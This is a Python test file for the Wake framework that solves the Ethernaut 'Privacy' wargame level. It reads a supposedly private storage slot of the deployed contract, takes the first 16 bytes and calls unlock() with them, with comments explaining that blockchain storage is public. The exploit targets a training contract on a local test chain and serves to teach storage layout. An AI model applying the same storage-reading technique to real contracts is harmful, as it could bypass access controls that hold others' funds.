from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv12_privacy import Privacy

@default_chain.connect()
def test_lv12():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv12()
    exploit_lv12(contract)
    ethernaut.check_lv12(contract)

def exploit_lv12(contract: Privacy):
    # Attack vector: Blockchain is public, no data can be hidden
    # Training: Learn how storage layout works and how you can explore it using the testing framework
    # wake print storage-layout contracts/lv12_privacy.sol
    # read from storage data[2]
    stored_data_2: bytes = read_storage_variable(Account(contract.address), "data", keys=[2])

    print(stored_data_2)
    # extract first 16 bytes of data[2] => bytes16(data[2])
    unlock_key = stored_data_2[0:16]
    print(unlock_key)
    contract.unlock(unlock_key)
